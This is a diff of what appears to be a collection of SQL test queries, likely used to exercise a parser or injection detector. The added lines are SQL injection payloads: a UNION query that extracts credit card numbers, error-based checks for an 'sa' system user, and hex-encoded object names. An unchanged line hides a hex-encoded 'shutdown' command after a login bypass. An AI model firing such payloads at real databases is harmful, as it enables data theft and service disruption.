@@ -163,11 +163,11 @@ where Dno = 0xffe;
 
 select Fname, Lname, Ssn
 from EMPLOYEE
-where Dno = U+0021;
+where Dno = U+176e;
 
 select Fname, Lname, Ssn
 from EMPLOYEE
-where Dno = char(U+0021);
+where Dno = char(u+0021);
 
 SELECT *
 FROM users
@@ -180,3 +180,26 @@ WHERE login= '' AND pass=' ';char(0x73687574646f776e) '
 SELECT name, description, price
 FROM products
 WHERE category=1 UNION SELECT 'A','B', 3 FROM all_tables
+
+SELECT Name, Phone
+FROM User
+WHERE Id=1 UNION ALL SELECT creditCardNumber, 1 FROM CreditCarTable
+
+SELECT name, email
+FROM members
+WHERE id=1; IF SYSTEM_USER='sa' SELECT 1/0
+ELSE SELECT 5
+
+SELECT name, email
+FROM members
+WHERE id=1; IF SYSTEM_USER='sa' SELECT 1/0
+THEN SELECT 5
+
+SELECT NAME,ID
+FROM SYSOBJECTS
+WHERE NAME = 0x7300790073006F0062006A006500630074;
+
+SELECT name, email
+FROM members
+WHERE id=1 AND SYSTEM_USER='sa' THEN SELECT 1/0
+ELSE SELECT 5;
